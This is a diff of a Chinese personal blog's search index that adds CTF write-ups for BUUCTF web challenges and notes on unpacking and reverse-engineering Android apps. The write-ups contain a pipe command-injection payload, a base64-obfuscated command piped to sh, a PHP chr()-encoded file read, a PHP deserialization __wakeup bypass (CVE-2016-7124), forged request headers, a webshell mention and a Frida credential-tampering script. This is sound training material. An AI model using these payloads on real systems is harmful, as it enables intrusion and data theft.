@@ -1,6 +1,25 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>加壳与脱壳</title>
+    <url>/2020/11/11/%E5%8A%A0%E5%A3%B3%E4%B8%8E%E8%84%B1%E5%A3%B3/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="逆向分析和脱壳的意义"><a href="#逆向分析和脱壳的意义" class="headerlink" title="逆向分析和脱壳的意义"></a>逆向分析和脱壳的意义</h1><h3 id="逆向分析app的一般流程"><a href="#逆向分析app的一般流程" class="headerlink" title="逆向分析app的一般流程"></a>逆向分析app的一般流程</h3><ol>
+<li>自动化工具检测是否加壳</li>
+<li>如果加壳。对app脱壳。</li>
+<li>使用反编译工具对app进行反编译</li>
+<li>根据关键字符串、关键api调用，快速定位关键函数和流程</li>
+<li>如果无法快速定位，apk可能使用了字符串加密、反射调用等手段，此时结合hook和动态调试进行分析</li>
+<li>根据是java实现还是jni实现进一步分析。</li>
+</ol>
+]]></content>
+      <categories>
+        <category>逆向</category>
+      </categories>
+      <tags>
+        <tag>android应用安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>buuctf-web-1</title>
     <url>/2020/11/09/buuctf-web-1/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h1><p><img src="/2020/11/09/buuctf-web-1/image-20201109115411137.png" alt="image-20201109115411137"></p>
@@ -63,6 +82,48 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span><span class="variable">$IFS</span><span class="variable">$1Y2F0IGZsYWcucGhw</span>|base64<span class="variable">$IFS</span><span class="variable">$1</span>-d|sh</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/11/09/buuctf-web-1/image-20201109194602514.png" alt="image-20201109194602514"></p>
+<h1 id="Easy-Calc1"><a href="#Easy-Calc1" class="headerlink" title="Easy Calc1"></a>Easy Calc1</h1><p>源码泄露，</p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201110220526310.png" alt="image-20201110220526310"></p>
+<p>然后发现字符被过滤了，使用php解析字符串的特性绕过，问号后边加空格。</p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201110220712407.png" alt="image-20201110220712407"></p>
+<p>读取目录，但是单引号被过滤了，使用如下payload：</p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201110220951863.png" alt="image-20201110220951863"></p>
+<p>读取f1agg文件，</p>
+<p><code>? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));</code></p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201110221327620.png" alt="image-20201110221327620"></p>
+<h1 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h1><h3 id><a href="#" class="headerlink" title></a></h3><p>payload：</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">123|cat <span class="built_in">..</span>/<span class="built_in">..</span>/<span class="built_in">..</span>/<span class="built_in">..</span>/flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/11/09/buuctf-web-1/image-20201111173214101.png" alt="image-20201111173214101"></p>
+<h1 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h1><p><img src="/2020/11/09/buuctf-web-1/image-20201112152241674.png" alt="image-20201112152241674"></p>
+<p>连接一句话马，</p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201112152304644.png" alt="image-20201112152304644"></p>
+<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>通过尝试，找到了<a href="http://www.zip备份目录，审计源码。" target="_blank" rel="noopener">www.zip备份目录，审计源码。</a></p>
+<p>反序列化学习：<a href="https://www.jianshu.com/p/1d2c65601d2a" target="_blank" rel="noopener">https://www.jianshu.com/p/1d2c65601d2a</a></p>
+<p>输出flag的是class.php：</p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201113214722442.png" alt="image-20201113214722442"></p>
+<p><code>unserialize()</code> 会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用 <code>__wakeup</code> 方法，预先准备对象需要的资源。</p>
+<p>绕过wakeup方法：</p>
+<p><strong>当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</strong></p>
+<p>所以可以构造exp：</p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201118212526526.png" alt="image-20201118212526526"></p>
+<p>将属性值2改为大于2的就可以了。因为有不可打印字符，所以我们对\0进行url编码。</p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201118213222658.png" alt="image-20201118213222658"></p>
+<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">index.php?select=O:<span class="number">4</span>:<span class="string">"Name"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">14</span>:<span class="string">"%00Name%00username"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;<span class="string">s:</span><span class="number">14</span>:<span class="string">"%00Name%00password"</span>;<span class="string">i:</span><span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h1><p>访问secret.php：</p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201118214105813.png" alt="image-20201118214105813"></p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201118214112544.png" alt="image-20201118214112544"></p>
+<p>我们设置referer试试，</p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201118214151473.png" alt="image-20201118214151473"></p>
+<p>再设置user-agent：</p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201118214306684.png" alt="image-20201118214306684"></p>
+<p>本地只读，伪造ip：</p>
+<p><img src="/2020/11/09/buuctf-web-1/image-20201118214420371.png" alt="image-20201118214420371"></p>
+<p>拿到flag</p>
+<p>http请求包：</p>
+<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">GET <span class="regexp">/Secret.php HTTP/</span><span class="number">1.1</span></span><br><span class="line"><span class="string">Host:</span> node3.buuoj.<span class="string">cn:</span><span class="number">26085</span></span><br><span class="line">Proxy-<span class="string">Connection:</span> keep-alive</span><br><span class="line"><span class="string">Referer:</span> <span class="string">https:</span><span class="comment">//www.Sycsecret.com</span></span><br><span class="line">Cache-<span class="string">Control:</span> max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-<span class="string">Requests:</span> <span class="number">1</span></span><br><span class="line">User-<span class="string">Agent:</span> Syclover</span><br><span class="line">X-Forwarded-<span class="string">For:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="string">Accept:</span> text<span class="regexp">/html,application/</span>xhtml+xml,application<span class="regexp">/xml;q=0.9,image/</span>webp,image<span class="regexp">/apng,*/</span>*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.9</span></span><br><span class="line">Accept-<span class="string">Encoding:</span> gzip, deflate</span><br><span class="line">Accept-<span class="string">Language:</span> zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line"><span class="string">Cookie:</span> UM_distinctid=<span class="number">175</span>b7bc59d4266<span class="number">-032275</span>eb541e94<span class="number">-4353760</span><span class="number">-144000</span><span class="number">-175</span>b7bc59d5358</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>web</category>
@@ -238,6 +299,7 @@
 
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_message_hadler</span><span class="params">(message, payload)</span>:</span></span><br><span class="line">    print(message)</span><br><span class="line">    print(payload)</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">"type"</span>] == <span class="string">"send"</span>:</span><br><span class="line">        print(message[<span class="string">"payload"</span>])</span><br><span class="line">        data = message[<span class="string">"payload"</span>].split(<span class="string">":"</span>)[<span class="number">1</span>].strip()</span><br><span class="line">        print(<span class="string">'message:'</span>, message)</span><br><span class="line">        data = str(base64.b64decode(data))</span><br><span class="line">        print(<span class="string">'data:'</span>, data)</span><br><span class="line">        usr, pw = data.split(<span class="string">":"</span>)</span><br><span class="line">        print(<span class="string">'pw: '</span>, pw)</span><br><span class="line">        data = str(base64.b64encode((<span class="string">"admin"</span> + pw).encode()))</span><br><span class="line">        print(<span class="string">"encode data:"</span>, data)</span><br><span class="line">        script.post(&#123;<span class="string">"my_data"</span>:data&#125;)</span><br><span class="line">        print(<span class="string">"Modified data sent!"</span>)</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">session = device.attach(<span class="string">"com.example.lesson7sec"</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"lesson7sec.js"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.on(<span class="string">"message"</span>, my_message_hadler)</span><br><span class="line">script.load()</span><br><span class="line">input()</span><br></pre></td></tr></table></figure>
 
+<p><strong>d8可以将class打包成dex</strong></p>
 ]]></content>
       <categories>
         <category>逆向</category>
